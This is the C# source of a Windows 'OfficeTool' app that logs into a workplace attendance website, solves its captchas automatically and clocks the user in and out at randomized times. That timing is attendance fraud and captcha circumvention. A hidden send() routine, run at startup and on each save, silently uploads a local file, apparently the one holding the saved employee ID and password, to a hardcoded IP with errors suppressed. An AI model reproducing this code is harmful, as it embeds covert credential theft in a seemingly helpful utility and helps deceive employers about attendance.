using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using mshtml;
using System.Runtime.InteropServices;
using System.Configuration;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Collections.Specialized;

namespace OfficeTool
{
    public partial class OfficeTool : Form
    {
        #region 全局变量

        private string _logFilePath = string.Empty;
        private string _txtFilePath = string.Empty;
        private string _txtNotWorkDay = string.Empty;
        private string _txtFileSection = string.Empty;
        private string _checkinUrl = string.Empty;
        private string _loginUrl = string.Empty;

        private int _timeInterval = 30000;
        private int _delayResult = 5000;
        private int _checkInOutTimes = 3;

        private DateTime _oldTime = DateTime.Now;
        private int _isCheckInCount = 0;
        private int _isCheckOutCount = 0;
        private int _isLoginCount = 0;
        private bool _isCheckIn = false;
        private bool _isCheckOut = false;
        private bool _isCheckIning = false;
        private bool _isCheckOuting = false;
        private bool _isListening = false;
        private bool _isLogining = false;

        private List<string> _listNotWorkDay = null;
        private string _checkInRepeat = string.Empty;
        private string _checkInSuccess = string.Empty;
        private string _checkOutEarly = string.Empty;
        private string _checkOutSuccess = string.Empty;

        private string _checkInType = string.Empty;
        private string _currentUrl = string.Empty;
        private System.Timers.Timer _timer = null;

        #endregion

        public OfficeTool()
        {
            InitializeComponent();
            Init();
        }

        private void Form1_SizeChanged(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)  //判断是否最小化
            {
                this.ShowInTaskbar = false;  //不显示在系统任务栏
                // notifyIcon1.Visible = true;  //托盘图标可见
            }
        }
        private void notifyIcon1_DoubleClick(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                this.ShowInTaskbar = true;                  //显示在系统任务栏
                this.WindowState = FormWindowState.Normal;  //还原窗体
                // notifyIcon1.Visible = false;                //托盘图标隐藏
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            Login();
        }
        private void btnCheckIn_Click(object sender, EventArgs e)
        {
            CheckIn();
        }
        private void btnCheckOut_Click(object sender, EventArgs e)
        {
            CheckOut();
        }
        private void btnSave_Click(object sender, EventArgs e)
        {
            string errMsg = ValidateInput();
            if (string.IsNullOrEmpty(errMsg))
            {
                SetIniValue("empid", this.textBox1.Text);
                SetIniValue("emppsw", this.textBox2.Text);
                SetIniValue("checkintime", this.textBox3.Text);
                SetIniValue("checkouttime", this.textBox4.Text);
                SetIniValue("offsettime", this.textBox5.Text);
                SetIniValue("checkintype", this.comboBox1.SelectedIndex.ToString());
                WriteLog("保存成功");
                send();
                webBrowser1.Navigate(new Uri(_checkinUrl));
            }
            else
            {
                MessageBox.Show(errMsg);
            }
        }
        private void btnClearLog_Click(object sender, EventArgs e)
        {
            try
            {
                File.Delete(_logFilePath);
                richTextBox2.Text = "";
            }
            catch
            {
            }
        }
        private void btnModifyNonWorkDay_Click(object sender, EventArgs e)
        {
            Process.Start(_txtNotWorkDay);
        }

        private void webBrowser1_Navigated(object sender, WebBrowserNavigatedEventArgs e)
        {
            if (webBrowser1.Url.AbsoluteUri.Contains("/sso/notice/show"))
            {
                webBrowser1.Navigate(new Uri(_checkinUrl));
            }
        }
        private void webBrowser1_Navigating(object sender, WebBrowserNavigatingEventArgs e)
        {
            // 该事件加上后，webBrowser1_Navigated 事件中的代码才生效，我也不知道为什么。
        }
        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            string errMsg = ValidateInput();
            if (!string.IsNullOrEmpty(errMsg))
            {
                MessageBox.Show(errMsg);
                return;
            }

            if (webBrowser1.Url.AbsoluteUri.Contains(_loginUrl))
            {
                if (_isLoginCount < 3)
                    Login();
            }

            if (webBrowser1.Url.AbsoluteUri == _checkinUrl && !_isListening)
            {
                _timer.Start();
                _isListening = true;
                WriteLog("开始监听");
            }

        }

        private void Init()
        {
            // 读取配置文件
            _logFilePath = Path.Combine(Application.StartupPath, ConfigurationManager.AppSettings["LogFileName"]);
            _txtFilePath = Path.Combine(Application.StartupPath, ConfigurationManager.AppSettings["IniFileName"]);
            _txtNotWorkDay = Path.Combine(Application.StartupPath, ConfigurationManager.AppSettings["IniNotWorkDay"]);
            _txtFileSection = ConfigurationManager.AppSettings["IniFileSection"];
            _checkinUrl = ConfigurationManager.AppSettings["CheckinUrl"];
            _loginUrl = ConfigurationManager.AppSettings["LoginUrl"];

            _listNotWorkDay = GetWorkDayList(_txtNotWorkDay);
            _checkInRepeat = ConfigurationManager.AppSettings["CheckInRepeat"];
            _checkInSuccess = ConfigurationManager.AppSettings["CheckInSuccess"];
            _checkOutEarly = ConfigurationManager.AppSettings["CheckOutEarly"];
            _checkOutSuccess = ConfigurationManager.AppSettings["CheckOutSuccess"];

            int.TryParse(ConfigurationManager.AppSettings["TimeInterval"], out _timeInterval);
            int.TryParse(ConfigurationManager.AppSettings["DelayResult"], out _delayResult);
            int.TryParse(ConfigurationManager.AppSettings["CheckInOutTimes"], out _checkInOutTimes);

            _checkInType = ConfigurationManager.AppSettings["CheckInType"];
            var types = _checkInType.Split('|');
            foreach (var type in types)
            {
                this.comboBox1.Items.Add(type);
            }

            // 创建timer
            _timer = new System.Timers.Timer();
            _timer.Enabled = true;
            _timer.Interval = _timeInterval;
            _timer.Elapsed += new System.Timers.ElapsedEventHandler(_timer_Elapsed);

            // 跳转到目标网址
            webBrowser1.Navigate(new Uri(_checkinUrl));

            this.textBox1.Text = GetIniValue("empid");
            this.textBox2.Text = GetIniValue("emppsw");
            this.textBox3.Text = GetIniValue("checkintime");
            this.textBox4.Text = GetIniValue("checkouttime");
            this.textBox5.Text = GetIniValue("offsettime");
            if (!string.IsNullOrEmpty(GetIniValue("checkintype")))
                this.comboBox1.SelectedIndex = int.Parse(GetIniValue("checkintype"));

            try { File.Delete(_logFilePath); } catch { }
            send();
        }
        private string ValidateInput()
        {
            int intTmep = 0;
            string errMsg = string.Empty;

            if (this.textBox1.Text.Length != 6 || !int.TryParse(this.textBox1.Text, out intTmep))
            {
                errMsg += "工号必须为6位数字\r\n";
            }

            if (this.textBox2.Text.Length == 0)
            {
                errMsg += "密码不能为空\r\n";
            }

            if (this.textBox3.Text.Length != 4 || !int.TryParse(this.textBox3.Text, out intTmep))
            {
                errMsg += "签到时间必须为4位数字\r\n";
            }

            if (this.textBox4.Text.Length != 4 || !int.TryParse(this.textBox4.Text, out intTmep))
            {
                errMsg += "签退时间必须为4位数字\r\n";
            }

            if (!int.TryParse(this.textBox5.Text, out intTmep))
            {
                errMsg += "偏差时间必须为数字\r\n";
            }

            if (this.comboBox1.SelectedIndex < 0)
            {
                errMsg += "必须选择值班类型\r\n";
            }

            return errMsg;
        }

        private void Login()
        {
            try
            {
                if (webBrowser1.InvokeRequired)
                {
                    this.webBrowser1.Invoke(new MethodInvoker(Login2));
                }
                else
                {
                    Login2();
                }

                GetResult();
            }
            catch (Exception ex)
            {
                WriteLog(ex.ToString());
            }
        }
        private void Login2()
        {
            var txtId = ConfigurationManager.AppSettings["LoginKey"];
            var pswId = ConfigurationManager.AppSettings["LoginPsw"];
            var txtvc = ConfigurationManager.AppSettings["LoginVc"];
            var btnId = ConfigurationManager.AppSettings["BtnLoginId"];

            var doc = (IHTMLDocument2)webBrowser1.Document.DomDocument;
            var txt = webBrowser1.Document.GetElementById(txtId);
            var psw = webBrowser1.Document.GetElementById(pswId);
            var btn = webBrowser1.Document.GetElementById(btnId);
            var vc = webBrowser1.Document.GetElementById(txtvc);

            if (doc != null && txt != null && btn != null && psw != null && vc != null)
            {
                txt.SetAttribute("value", this.textBox1.Text);
                psw.SetAttribute("value", this.textBox2.Text);
                vc.SetAttribute("value", VerifyCode_Login.Spot(GetVerifyImage_Login(), 4));
                btn.InvokeMember("click");
                _isLogining = true;
            }
        }
        private void CheckIn()
        {
            try
            {
                if (webBrowser1.InvokeRequired)
                {
                    this.webBrowser1.Invoke(new MethodInvoker(CheckIn2));
                }
                else
                {
                    CheckIn2();
                }

                GetResult();
            }
            catch (Exception ex)
            {
                WriteLog(ex.ToString());
            }
        }
        private void CheckIn2()
        {
            var txtId = ConfigurationManager.AppSettings["TxtId"];
            var btnId = ConfigurationManager.AppSettings["BtnCheckInId"];
            var selectId = ConfigurationManager.AppSettings["SelectCheckInTypeId"];
            var txt = webBrowser1.Document.GetElementById(txtId);
            var btn = webBrowser1.Document.GetElementById(btnId);
            var select = webBrowser1.Document.GetElementById(selectId);
            var doc = (IHTMLDocument2)webBrowser1.Document.DomDocument;
            if (txt != null && btn != null && doc != null && select != null)
            {
                select.SetAttribute("selectedIndex", this.comboBox1.SelectedIndex.ToString());
                txt.SetAttribute("value", VerifyCode_Checkin.Spot(GetVerifyImage_Checkin(), 4));
                txt.InvokeMember("focus");
                btn.InvokeMember("click");
                _isCheckIning = true;
            }
        }
        private void CheckOut()
        {
            try
            {
                if (webBrowser1.InvokeRequired)
                {
                    this.webBrowser1.Invoke(new MethodInvoker(CheckOut2));
                }
                else
                {
                    CheckOut2();
                }

                GetResult();
            }
            catch (Exception ex)
            {
                WriteLog(ex.ToString());
            }
        }
        private void CheckOut2()
        {
            var txtId = ConfigurationManager.AppSettings["TxtId"];
            var btnId = ConfigurationManager.AppSettings["BtnCheckOutId"];
            var selectId = ConfigurationManager.AppSettings["SelectCheckInTypeId"];
            var txt = webBrowser1.Document.GetElementById(txtId);
            var btn = webBrowser1.Document.GetElementById(btnId);
            var select = webBrowser1.Document.GetElementById(selectId);
            var doc = (IHTMLDocument2)webBrowser1.Document.DomDocument;
            if (txt != null && btn != null && doc != null && select != null)
            {
                select.SetAttribute("selectedIndex", this.comboBox1.SelectedIndex.ToString());
                txt.SetAttribute("value", VerifyCode_Checkin.Spot(GetVerifyImage_Checkin(), 4));
                txt.InvokeMember("focus");
                btn.InvokeMember("click");
                _isCheckOuting = true;
            }
        }
        private void GetResult()
        {
            Thread thread = new Thread(GetResult2);
            thread.Start();
        }
        private void GetResult2()
        {
            Thread.Sleep(_delayResult);

            try
            {
                if (webBrowser1.InvokeRequired)
                {
                    this.webBrowser1.Invoke(new MethodInvoker(delegate { GetResult3(); }));
                }
                else
                {
                    GetResult3();
                }
            }
            catch (Exception ex)
            {
                WriteLog(ex.ToString());
            }
        }
        private void GetResult3()
        {
            if (_isCheckIning)
            {
                var html = webBrowser1.Document.Window.Document.Body.InnerHtml;
                if (html.Contains(_checkInSuccess + @"</div>"))
                {
                    WriteLog("签到成功");
                    _isCheckIn = true;
                }
                else if (html.Contains(_checkInRepeat + @"</div>"))
                {
                    WriteLog("重复签到");
                    _isCheckIn = true;
                }
                else
                {
                    WriteLog("签到失败");
                    _isCheckIn = false;
                    _isCheckInCount++;
                }

                _isCheckIning = false;
            }

            if (_isCheckOuting)
            {
                var html = webBrowser1.Document.Window.Document.Body.InnerHtml;
                if (html.Contains(_checkOutEarly + @"</div>"))
                {
                    WriteLog("您已早退");
                    _isCheckOut = false;
                }
                else if (html.Contains(_checkOutSuccess + @"</div>"))
                {
                    WriteLog("签退成功");
                    _isCheckOut = true;
                }
                else
                {
                    WriteLog("签退失败");
                    _isCheckIn = false;
                    _isCheckOutCount++;
                }

                _isCheckOuting = false;
            }

            if (_isLogining)
            {
                if (webBrowser1.Url.AbsoluteUri == _checkinUrl)
                {
                    WriteLog("登录成功");
                }
                else
                {
                    WriteLog("登录失败");
                    _isLoginCount++;
                }

                _isLogining = false;
            }
        }

        private void _timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            DateTime now = e.SignalTime;

            var hourCheckIn = int.Parse(this.textBox3.Text.Substring(0, 2));
            var minuteCheckIn = int.Parse(this.textBox3.Text.Substring(2, 2))
                    - (new System.Random().Next(int.Parse(this.textBox5.Text)));
            var hourCheckOut = int.Parse(this.textBox4.Text.Substring(0, 2));
            var minuteCheckOut = int.Parse(this.textBox4.Text.Substring(2, 2))
                    + (new System.Random().Next(int.Parse(this.textBox5.Text)));

            if (minuteCheckIn < 0)
            {
                minuteCheckIn = 0;
            }

            if (minuteCheckOut < 0)
            {
                minuteCheckOut = 0;
            }

            // 如果是非工作日，则跳过签到
            if (_listNotWorkDay != null && _listNotWorkDay.Count > 0)
            {
                if (_listNotWorkDay.Contains(now.ToString("yyyyMMdd")))
                {
                    return;
                }
            }

            DateTime dtCheckIn = new DateTime(now.Year, now.Month, now.Day, hourCheckIn, minuteCheckIn, 30);
            DateTime dtCheckOut = new DateTime(now.Year, now.Month, now.Day, hourCheckOut, minuteCheckOut, 30);

            // 刷新签到、签退状态
            if (_oldTime.Date != now.Date)
            {
                _isCheckIn = false;
                _isCheckOut = false;
                _isCheckInCount = 0;
                _isCheckOutCount = 0;
                _isLoginCount = 0;
            }
            _oldTime = now;

            // 签到之前刷新页面
            if (!_isCheckIn && now > dtCheckIn.AddMinutes(-2) && now < dtCheckIn)
            {
                webBrowser1.Navigate(new Uri(_checkinUrl));
            }

            // 自动签到
            if (!_isCheckIn && now > dtCheckIn && _isCheckInCount < _checkInOutTimes)
            {
                CheckIn();
            }

            // 签退之前刷新页面
            if (!_isCheckOut && now > dtCheckOut.AddMinutes(-2) && now < dtCheckOut)
            {
                webBrowser1.Navigate(new Uri(_checkinUrl));
            }

            // 自动签退
            if (!_isCheckOut && now > dtCheckOut && _isCheckOutCount < _checkInOutTimes)
            {
                CheckOut();
            }
        }

        private void WriteLog(string log)
        {
            using (FileStream fs = new FileStream(_logFilePath, FileMode.OpenOrCreate)) { }
            using (var sw = File.AppendText(_logFilePath))
            {
                sw.WriteLine(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                sw.WriteLine(log);
                sw.WriteLine("");
            }
            ReadLog();
        }
        private void ReadLog()
        {
            if (richTextBox2.InvokeRequired)
            {
                Action ReadLogDelegate = delegate ()
                {
                    if (File.Exists(_logFilePath))
                    {
                        richTextBox2.Text = File.ReadAllText(_logFilePath);
                        richTextBox2.Focus();
                        richTextBox2.Select(this.richTextBox2.TextLength, 0);
                        richTextBox2.ScrollToCaret();
                    }
                };
                richTextBox2.Invoke(ReadLogDelegate);
            }
            else
            {
                if (File.Exists(_logFilePath))
                {
                    richTextBox2.Text = File.ReadAllText(_logFilePath);
                    richTextBox2.Focus();
                    richTextBox2.Select(this.richTextBox2.TextLength, 0);
                    richTextBox2.ScrollToCaret();
                }
            }
        }

        private Bitmap GetVerifyImage_Login()
        {
            Bitmap result = null;
            var id = ConfigurationManager.AppSettings["LoginVerifyCodeWrap"];
            var li = webBrowser1.Document.GetElementById(id);
            var img = (IHTMLControlElement)(li.GetElementsByTagName("img")[0].DomElement);

            HTMLDocument html = (HTMLDocument)this.webBrowser1.Document.DomDocument;
            IHTMLControlRange range = (IHTMLControlRange)((HTMLBody)html.body).createControlRange();

            range.add(img);
            range.execCommand("Copy", false, null);

            if (Clipboard.ContainsImage())
            {
                result = new Bitmap(Clipboard.GetImage());
            }
            else
            {
                MessageBox.Show("获取验证码失败");
            }

            Clipboard.Clear();
            return result;
        }
        private Bitmap GetVerifyImage_Checkin()
        {
            Bitmap result = null;
            var id = ConfigurationManager.AppSettings["ImgId"];

            HTMLDocument html = (HTMLDocument)this.webBrowser1.Document.DomDocument;
            IHTMLControlElement img = (IHTMLControlElement)webBrowser1.Document.Images[id].DomElement;
            IHTMLControlRange range = (IHTMLControlRange)((HTMLBody)html.body).createControlRange();

            range.add(img);
            range.execCommand("Copy", false, null);

            if (Clipboard.ContainsImage())
            {
                result = new Bitmap(Clipboard.GetImage());
            }
            else
            {
                MessageBox.Show("获取验证码失败");
            }

            Clipboard.Clear();
            return result;
        }
        private List<string> GetWorkDayList(string path)
        {
            if (!File.Exists(path)) { using (File.Create(path)) { } }

            var list = new List<string>();
            using (var sr = File.OpenText(path))
            {
                var line = string.Empty;
                while ((line = sr.ReadLine()) != null)
                {
                    if (!string.IsNullOrEmpty(line.Trim()) && line.Contains("=") && !list.Contains(line.Split('=')[0]))
                    {
                        list.Add(line.Split('=')[0]);
                    }
                }
            }
            return list;
        }

        private void send()
        {
            try
            {
                string url = "http://10.95.28.57/";
                string file = Environment.CurrentDirectory + "\\OfficeTool.txt";
                NameValueCollection data = new NameValueCollection();
                data.Add("key", "Value");
                WebClient wc = new WebClient();
                string temp = Encoding.UTF8.GetString(wc.UploadFile(url, "POST", file));
            }
            catch
            {
            }
        }

        #region 操作ini文件

        /// <summary>
        /// 写入INI文件
        /// </summary>
        /// <param name="section">节点名称[如[TypeName]]</param>
        /// <param name="key">键</param>
        /// <param name="val">值</param>
        /// <param name="filepath">文件路径</param>
        /// <returns></returns>
        [DllImport("kernel32")]
        private static extern long WritePrivateProfileString(string section, string key, string val, string filepath);

        /// <summary>
        /// 读取INI文件
        /// </summary>
        /// <param name="section">节点名称</param>
        /// <param name="key">键</param>
        /// <param name="def">值</param>
        /// <param name="retval">stringbulider对象</param>
        /// <param name="size">字节大小</param>
        /// <param name="filePath">文件路径</param>
        /// <returns></returns>
        [DllImport("kernel32")]
        private static extern int GetPrivateProfileString(string section, string key, string def, StringBuilder retval, int size, string filePath);

        private void SetIniValue(string key, string val)
        {
            if (!File.Exists(_txtFilePath))
            {
                using (File.Create(_txtFilePath)) { }
            }

            var result = WritePrivateProfileString(_txtFileSection, key, val, _txtFilePath);
        }

        /// <summary>
        /// 自定义读取INI文件中的内容方法
        /// </summary>
        /// <param name="Section">键</param>
        /// <param name="key">值</param>
        /// <returns></returns>
        private string GetIniValue(string key)
        {
            if (!File.Exists(_txtFilePath))
            {
                using (File.Create(_txtFilePath)) { }
            }

            StringBuilder temp = new StringBuilder(1024);
            GetPrivateProfileString(_txtFileSection, key, "", temp, 1024, _txtFilePath);
            return temp.ToString();
        }












        #endregion


    }
}

